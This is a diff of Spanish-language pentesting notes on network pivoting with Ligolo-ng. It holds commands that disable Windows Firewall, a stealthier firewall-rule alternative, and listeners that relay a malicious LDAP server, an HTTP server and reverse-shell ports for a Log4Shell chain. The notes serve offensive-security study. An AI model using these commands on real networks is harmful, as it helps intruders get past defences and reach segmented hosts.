@@ -8,14 +8,14 @@ Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa,
 
 El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separar diferentes partes de la red, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra.
 
-## Ejemplo de red 
-
-[![Ligolo.png | 800](https://i.postimg.cc/5NdP2MyL/Ligolo.png)](https://postimg.cc/8s4dZ9hz)
-
 ## IMPORTANTE
 
 ```bash 
 	TIP 1:
+
+# Verificar estado actual antes de tocar nada
+❯ netsh advfirewall show allprofiles state
+
 # Deshabilitar Windows Firewall (requiere High integrity / SYSTEM)
 ❯ netsh advfirewall set allprofiles state off
 # Deshabilita los 3 perfiles: Domain, Private y Public
@@ -24,9 +24,6 @@ El pivoting puede ser utilizado para superar restricciones de seguridad que de o
 
 # Alternativa — solo abrir el puerto específico sin deshabilitar todo (más sigiloso)
 ❯ netsh advfirewall firewall add rule name="Ligolo" dir=out action=allow protocol=TCP localport=<PORT>
-
-# Verificar estado actual antes de tocar nada
-❯ netsh advfirewall show allprofiles state
 
 # Restaurar al terminar (limpieza post-explotación)
 ❯ netsh advfirewall set allprofiles state on
@@ -51,6 +48,10 @@ del proceso:
 ## Ligolo (agente y proxy) 
 
 * [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases)
+
+![[ligolo_punto_a_punto_b.png]]
+
+
 ### Conectar un agente (Del Punto B al Punto A)
 
 ```bash 
@@ -77,8 +78,21 @@ PASO 3:
 ```
 
 ```bash 
-# Interfaz modo manual 
-PASO 1:
+EXTRA --> Si una vulne necesita puertos expecíficos se hace de la siguiente manera <--
+
+PASO 4: # Esto es para la vulne Log4Shell 
+# Sobre el agente de la máquina 'A' utiliza ligolo para redireccionar todo lo de Kali  
+# Hacelo por puerto
+❯ listener_add --addr 0.0.0.0:1389 --to 127.0.0.1:1389 --tcp  # LDAP Malicioso 
+❯ listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp  # Servicio HHTP
+❯ listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp  # Revershell 
+
+# Si se necesita una segunda revershell crear otro listener 
+❯ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp  # Revershell 2
+```
+
+```bash 
+PASO 1:  # Interfaz modo manual 
 ❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
 ❯ ip link set ligolo up 
 ❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
